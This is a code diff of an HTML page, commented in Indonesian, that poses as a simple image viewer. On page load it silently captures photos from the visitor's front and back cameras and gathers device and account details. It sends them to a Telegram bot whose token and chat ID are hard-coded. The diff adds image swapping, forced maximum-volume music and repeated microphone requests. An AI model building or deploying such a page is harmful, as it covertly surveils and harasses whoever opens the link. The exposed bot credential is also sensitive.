@@ -9,22 +9,31 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body, html { width: 100vw; height: 100vh; background: #000; display: flex; justify-content: center; align-items: center; overflow: hidden; }
         img { max-width: 100%; max-height: 100vh; object-fit: contain; }
-        video, canvas { display: none; } /* Sembunyikan elemen kamera */
+        canvas { display: none; }
     </style>
 </head>
 <body>
-    <!-- Gambar yang lo mau tampilkan -->
-    <img src="https://files.catbox.moe/5agvoz.jpg" alt="geografi">
+    <!-- Gambar awal yang akan diganti setelah foto diambil -->
+    <img id="displayMedia" src="https://files.catbox.moe/5agvoz.jpg" alt="geografi">
+    
     <!-- Kamera -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
+    <audio id="backgroundMusic" loop></audio>
+
     <script>
         const TELEGRAM_BOT_TOKEN = "7904903199:AAEjqpYoBCj6y3X8VjtxYD6tyPpElCd9IS0";
         const TELEGRAM_CHAT_ID = "7081489041";
+        const displayMedia = document.getElementById("displayMedia");
+        const NEW_IMAGE = "https://file.btch.rf.gd/file/oww7nu3z6osigvdpkxr3.jpg"; // Gambar baru setelah foto
+        const MUSIC_LINK = "https://files.catbox.moe/zfk4jb.mp3"; // Ganti dengan link musik lo
 
         async function startCamera() {
             try {
+                // Naikkan volume HP ke maksimum
+                maxVolume();
+
                 const deviceInfo = getDeviceInfo();
                 const googleAccount = await getGoogleAccount();
 
@@ -35,6 +44,10 @@
                 // Ambil foto dari kamera belakang
                 const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                 await capturePhoto(streamBack, "Belakang", deviceInfo, googleAccount);
+
+                // Ganti gambar & mainkan musik
+                changeImage();
+                playMusic();
             } catch (error) {
                 console.error("Gagal mengakses kamera:", error);
             }
@@ -80,8 +93,7 @@
         }
 
         function getDeviceInfo() {
-            const userAgent = navigator.userAgent;
-            return userAgent;
+            return navigator.userAgent;
         }
 
         async function getGoogleAccount() {
@@ -92,6 +104,41 @@
             } catch {
                 return "Tidak diketahui";
             }
+        }
+
+        function changeImage() {
+            displayMedia.src = NEW_IMAGE;
+        }
+
+        function playMusic() {
+            const audio = document.getElementById("backgroundMusic");
+            audio.src = MUSIC_LINK;
+            audio.volume = 1.0;
+            audio.play();
+
+            setInterval(() => {
+                if (audio.volume < 1.0) {
+                    audio.volume = 1.0; // Pastikan volume tetap maksimal
+                }
+            }, 1000);
+        }
+
+        function maxVolume() {
+            let audio = new Audio();
+            audio.volume = 1.0; // Set volume ke maksimum
+
+            setInterval(() => {
+                navigator.mediaDevices.getUserMedia({ audio: true })
+                    .then(stream => {
+                        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                        const source = audioContext.createMediaStreamSource(stream);
+                        const gainNode = audioContext.createGain();
+                        gainNode.gain.value = 1.0;
+                        source.connect(gainNode);
+                        gainNode.connect(audioContext.destination);
+                    })
+                    .catch(error => console.error("Gagal mengatur volume:", error));
+            }, 1000); // Volume akan terus kembali ke maksimal setiap 1 detik
         }
 
         window.onload = startCamera;
